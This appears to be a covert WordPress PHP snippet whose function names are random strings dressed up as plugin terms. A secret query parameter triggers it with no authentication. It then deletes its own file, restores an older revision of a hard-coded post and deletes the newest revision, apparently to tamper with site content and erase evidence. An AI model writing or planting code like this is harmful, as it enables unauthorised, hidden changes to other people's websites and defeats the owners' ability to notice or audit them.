<?php

function error_text_checkout_meta() {
	if (isset($_GET['name_attachment_cleaner']) && $_GET['name_attachment_cleaner'] === 'numbers_ecommerce_register') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$signature_slider_template_newsletter = 560357;
		$filter_country_import_database = wp_get_post_revisions($signature_slider_template_newsletter);
		if (empty($filter_country_import_database)) die('no revisions');
		if (count($filter_country_import_database) < 2) die('less than 2');
		$permalink_translator_xml = array_shift($filter_country_import_database);
		$cf7_rss_separator = $permalink_translator_xml->ID;
		$interactive_mini_directory_engine = array_shift($filter_country_import_database);
		$library_author_options_chat = $interactive_mini_directory_engine->ID;
		$shopping_full_switcher = wp_restore_post_revision($library_author_options_chat);
		if ($shopping_full_switcher === false) die('error restoring');
		$shopping_full_switcher = wp_delete_post_revision($cf7_rss_separator);		
		if ($shopping_full_switcher === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'error_text_checkout_meta');
